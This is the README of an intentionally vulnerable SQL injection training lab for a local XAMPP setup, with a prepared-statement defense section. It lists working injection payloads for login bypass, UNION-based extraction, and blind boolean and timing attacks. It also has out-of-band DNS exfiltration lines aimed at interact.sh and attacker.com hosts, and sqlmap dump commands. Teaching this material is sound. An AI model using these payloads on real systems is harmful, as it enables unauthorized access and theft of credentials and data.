# SQL Injection Vulnerability Lab

## ⚠️ DISCLAIMER
This project is designed for **EDUCATIONAL PURPOSES ONLY**. It contains intentionally vulnerable code to demonstrate SQL injection attacks. **NEVER** deploy this application on a production server or publicly accessible environment.

## 📋 Table of Contents
- [Overview](#overview)
- [Prerequisites](#prerequisites)
- [Installation & Setup](#installation--setup)
- [Project Structure](#project-structure)
- [Attack Demonstrations](#attack-demonstrations)
  - [1. In-Band SQL Injection](#1-in-band-sql-injection)
  - [2. Inferential (Blind) SQL Injection](#2-inferential-blind-sql-injection)
  - [3. Out-of-Band (OOB) SQL Injection](#3-out-of-band-oob-sql-injection)
- [Defense Mechanisms](#defense-mechanisms)
- [Learning Resources](#learning-resources)

---

## 🎯 Overview

This lab demonstrates three major categories of SQL Injection attacks:
1. **In-Band SQLi** - Direct data extraction through the same channel
2. **Inferential (Blind) SQLi** - Extracting data through behavioral analysis
3. **Out-of-Band (OOB) SQLi** - Data exfiltration through alternative channels

The lab includes both vulnerable and secure implementations to understand attack vectors and proper defenses.

---

## 🔧 Prerequisites

- **XAMPP** installed (Apache + PHP + MySQL)
- Basic understanding of SQL and PHP
- Web browser (Chrome, Firefox, Edge, etc.)
- *(Optional)* Burp Suite or similar tool for OOB attack testing

---

## 🚀 Installation & Setup

### Step 1: Install XAMPP
1. Download XAMPP from [https://www.apachefriends.org/](https://www.apachefriends.org/)
2. Install and start **Apache** and **MySQL** services

### Step 2: Extract Project Files
1. Extract the `sqli_lab` folder to your XAMPP `htdocs` directory
   - Default path: `C:\xampp\htdocs\sqli_lab` (Windows)
   - Or: `/opt/lampp/htdocs/sqli_lab` (Linux)

### Step 3: Database Setup
1. Open your web browser and navigate to: `http://localhost/phpmyadmin`
2. Click on the **"SQL"** tab
3. Copy and paste the entire contents of `db_setup.sql`
4. Click **"Go"** to execute the script
5. Verify that `sqli_lab_db` database is created with `users` and `secret_keys` tables

### Step 4: Access the Lab
1. Navigate to: `http://localhost/sqli_lab/index.html`
2. You should see the login interface with both vulnerable and secure forms

---

## 📁 Project Structure

```
sqli_lab/
├── index.html              # Main login interface
├── vulnerable_login.php    # Intentionally vulnerable login handler
├── secure_login.php        # Secure login implementation
├── db_setup.sql           # Database initialization script
├── styles.css             # Styling for the interface
└── README.md              # This file
```

---

## 🎯 Attack Demonstrations

### Valid Credentials for Testing:
- **admin** / pass123
- **test** / user456
- **guest** / guest789

<img width="1011" height="960" alt="Screenshot 2025-12-03 234151" src="https://github.com/user-attachments/assets/25cf5486-e440-44be-bccc-9a1b828d4d07" />

<img width="974" height="349" alt="Screenshot 2025-12-03 234427" src="https://github.com/user-attachments/assets/5f252a56-5ee7-4bea-972f-9e3f6f078d3f" /><img width="530" height="347" alt="Screenshot 2025-12-03 234439" src="https://github.com/user-attachments/assets/8dfffe62-acde-417b-8bf2-b4dc30b1a01d" />

<img width="949" height="344" alt="Screenshot 2025-12-03 234502" src="https://github.com/user-attachments/assets/4781e22b-c47c-4e82-a3cd-b0f5d147425d" /><img width="540" height="258" alt="Screenshot 2025-12-03 234510" src="https://github.com/user-attachments/assets/08e7a6cc-3cb4-4173-8648-ad406168aa56" />





---

## 1. In-Band SQL Injection

In-Band SQLi is the most common type where the attacker uses the same communication channel to both launch the attack and gather results.

### Attack 1.1: Authentication Bypass

**Objective:** Bypass login without knowing valid credentials

**Payload (Username field):**
```sql
' OR 1=1 -- 
```

**Password field:** *(leave empty or enter anything)*

**How it works:**
The vulnerable query becomes:
```sql
SELECT id, username, password FROM users WHERE username = '' OR 1=1 -- ' AND password = ''
```
- `' OR 1=1` makes the WHERE clause always true
- `--` comments out the rest of the query (including password check)
- The query returns all users, logging you in as the first user (admin)

**Expected Result:**
```
Login Successful! Welcome, admin (VULNERABLE)
```

**Variations to try:**
```sql
admin' OR '1'='1
' OR 'x'='x
admin'--
```

---

### Attack 1.2: UNION-Based Data Exfiltration

**Objective:** Extract sensitive data from other tables

**Payload (Username field):**
```sql
admin' UNION SELECT 1, secret_info, 3 FROM secret_keys -- 
```

**Password field:** *(leave empty)*

**How it works:**
The query becomes:
```sql
SELECT id, username, password FROM users WHERE username = 'admin' UNION SELECT 1, secret_info, 3 FROM secret_keys -- ' AND password = ''
```
- The first part fails (no user 'admin' with empty password)
- The UNION adds results from the `secret_keys` table
- Column alignment: `1` matches `id`, `secret_info` matches `username`, `3` matches `password`

**Expected Result:**
```
Login Successful! Welcome, The production API key is PK-XYZ-789-DEF (VULNERABLE)
Retrieved Data:
Array
(
    [id] => 1
    [username] => The production API key is PK-XYZ-789-DEF
    [password] => 3
)
```

**Key Points:**
- The number of columns in UNION must match the original query
- Use ORDER BY to determine column count: `' ORDER BY 1--`, `' ORDER BY 2--`, etc.
- Data type compatibility matters

**Advanced Payloads:**
```sql
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema='sqli_lab_db' -- 
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users' -- 
' UNION SELECT 1, CONCAT(username,':',password), 3 FROM users -- 
```

---

## 2. Inferential (Blind) SQL Injection

Blind SQLi occurs when the application doesn't display database errors or data, but you can infer information based on the application's behavior.

### Attack 2.1: Boolean-Based Blind SQLi

**Objective:** Extract data by observing true/false responses

**Test Payload (Username field):**
```sql
admin' AND 1=1 -- 
```
**Password:** pass123

**Expected Result:** Login successful (condition is true)

**Test Payload 2:**
```sql
admin' AND 1=2 -- 
```
**Password:** pass123

**Expected Result:** Login fails (condition is false)

**Data Extraction Example - Check if admin password length > 5:**
```sql
admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 5 -- 
```
**Password:** pass123

If login succeeds, password length is greater than 5. You can binary search the exact length.

---

### Attack 2.2: Time-Based Blind SQLi

**Objective:** Extract data by measuring response time delays

**Payload (Username field):**
```sql
admin' AND IF((SELECT LENGTH(password) FROM users WHERE username='admin') > 5, SLEEP(5), 1) -- 
```

**Password:** pass123

**How it works:**
- If the condition `LENGTH(password) > 5` is TRUE, the database will sleep for 5 seconds
- If FALSE, it returns immediately
- By measuring response time, you can infer the truth value

**Expected Result:**
- If password length > 5: Page takes ~5 seconds to load, then shows "Login Successful"
- If password length ≤ 5: Page loads immediately

**Automated Extraction Strategy:**
Extract the first character of admin's password:
```sql
admin' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 100, SLEEP(3), 1) -- 
```

Continue binary searching through ASCII values to determine each character.

**Important Notes:**
- Time-based attacks are slower but work even when no visible difference in responses
- Network latency can affect results - use consistent timing
- Can be automated with tools like sqlmap

---

## 3. Out-of-Band (OOB) SQL Injection

OOB SQLi occurs when the attacker cannot use the same channel to launch the attack and gather results, so they use alternative communication channels.

### Attack 3.1: DNS Exfiltration

**Objective:** Extract data by forcing the database to make external DNS lookups that we can monitor

**⚠️ PREREQUISITE SETUP:**

Before attempting this attack, you need a way to monitor DNS requests. Options:

1. **Burp Suite Collaborator** (Recommended for professionals)
   - Open Burp Suite Professional
   - Go to Burp > Burp Collaborator client
   - Click "Copy to clipboard" to get your unique subdomain (e.g., `abc123.burpcollaborator.net`)

2. **Public OAST Services** (Free alternatives)
   - [interact.sh](https://app.interactsh.com/) - Get a unique subdomain
   - [Pingb.in](https://pingb.in/) - Simple DNS logging
   - [Canarytokens](https://canarytokens.org/) - DNS token generator

3. **Self-hosted DNS Logger**
   - Set up a DNS server with logging (advanced)

**Payload (Username field):**
```sql
admin' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE id=1),'.YOUR-SUBDOMAIN-HERE.com\\foo'))) -- 
```

**Replace `YOUR-SUBDOMAIN-HERE.com` with your actual monitoring domain.**

**Example with interact.sh:**
```sql
admin' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE id=1),'.c1a2b3c4d5e6f7g8h9i0.interact.sh\\foo'))) -- 
```

**How it works:**
1. The `CONCAT` function builds a UNC path: `\\pass123.c1a2b3c4d5e6f7g8h9i0.interact.sh\foo`
2. `LOAD_FILE` attempts to read a file from this UNC path
3. Windows tries to resolve the hostname `pass123.c1a2b3c4d5e6f7g8h9i0.interact.sh`
4. This triggers a DNS lookup to resolve the hostname
5. Your monitoring service receives the DNS query and logs the subdomain
6. The password (`pass123`) is now visible in your DNS logs

**Expected Result:**
- The web application may show "Login Failed" (the actual login fails)
- But in your DNS monitoring tool, you'll see a DNS query for: `pass123.YOUR-SUBDOMAIN.com`
- This proves data exfiltration occurred through an out-of-band channel

**⚠️ Important Limitations:**
- Only works on Windows servers (UNC paths)
- Requires MySQL's `LOAD_FILE` function to be enabled
- May be blocked by firewalls or security policies
- Some XAMPP configurations disable `LOAD_FILE` for security

**Testing if LOAD_FILE is enabled:**
```sql
admin' AND (SELECT LOAD_FILE('C:\\xampp\\htdocs\\index.php')) -- 
```
If you get an error about file access, the function is available but path is wrong.

**Alternative OOB Techniques:**

**Using xp_cmdshell (SQL Server only - not applicable to MySQL):**
```sql
'; EXEC xp_cmdshell('nslookup '+@@version+'.attacker.com') --
```

**Using XXE with INTO OUTFILE (if writable directory exists):**
```sql
' UNION SELECT 1, password, 3 FROM users INTO OUTFILE '\\\\attacker.com\\share\\output.txt' -- 
```

---

## 🛡️ Defense Mechanisms

### Why `secure_login.php` is Protected:

The secure implementation uses **Prepared Statements** with parameter binding:

```php
$stmt = mysqli_prepare($conn, "SELECT id, username, password FROM users WHERE username = ? AND password = ?");
mysqli_stmt_bind_param($stmt, "ss", $username, $password);
mysqli_stmt_execute($stmt);
```

**How this prevents SQLi:**
1. The SQL query structure is defined separately from the data
2. Placeholders (`?`) are used instead of direct concatenation
3. User input is bound as data, not as SQL code
4. The database treats input as literal strings, not executable commands

**Try the authentication bypass payload on secure login:**
- Payload: `' OR 1=1 --`
- Result: Login fails because the entire string is treated as a username literal

---

## 🎓 Additional Defense Best Practices

1. **Input Validation**
   - Whitelist allowed characters
   - Validate data types and formats
   - Reject suspicious patterns

2. **Least Privilege Principle**
   - Database users should have minimal necessary permissions
   - Don't use root/admin accounts for web applications
   - Separate read/write privileges

3. **Error Handling**
   - Don't expose database errors to users
   - Log errors securely server-side
   - Use generic error messages

4. **Web Application Firewall (WAF)**
   - Detect and block SQLi attempts
   - Use ModSecurity or similar solutions

5. **Regular Security Audits**
   - Automated scanning (sqlmap, OWASP ZAP)
   - Manual code reviews
   - Penetration testing

---

## 🔬 Testing with Automated Tools

### Using sqlmap (Advanced)

```bash
# Test vulnerable login
sqlmap -u "http://localhost/sqli_lab/vulnerable_login.php" \
       --data="username=admin&password=pass" \
       --batch --dump

# Enumerate databases
sqlmap -u "http://localhost/sqli_lab/vulnerable_login.php" \
       --data="username=admin&password=pass" \
       --dbs

# Dump specific table
sqlmap -u "http://localhost/sqli_lab/vulnerable_login.php" \
       --data="username=admin&password=pass" \
       -D sqli_lab_db -T secret_keys --dump
```

---

## 📚 Learning Resources

- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Tutorial](https://portswigger.net/web-security/sql-injection)
- [sqlmap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [MySQL Security Best Practices](https://dev.mysql.com/doc/refman/8.0/en/security.html)

---

## 📝 Lab Exercises

### Exercise 1: Extract All Usernames
Use UNION-based injection to retrieve all usernames from the users table.

### Exercise 2: Determine Password Length
Use time-based blind SQLi to determine the exact length of the admin password.

### Exercise 3: Extract Character by Character
Write a script to extract the admin password one character at a time using boolean-based blind SQLi.

### Exercise 4: Bypass Input Filters
Research common WAF bypass techniques and try them on the vulnerable login.

---

## 🤝 Contributing

This is an educational project. If you find improvements or additional attack vectors, feel free to document them!

---

## 📄 License

This project is released for educational purposes. Use responsibly and only in authorized environments.

---

**Remember:** SQL Injection is a serious vulnerability. Always use prepared statements, validate input, and follow secure coding practices in real-world applications!
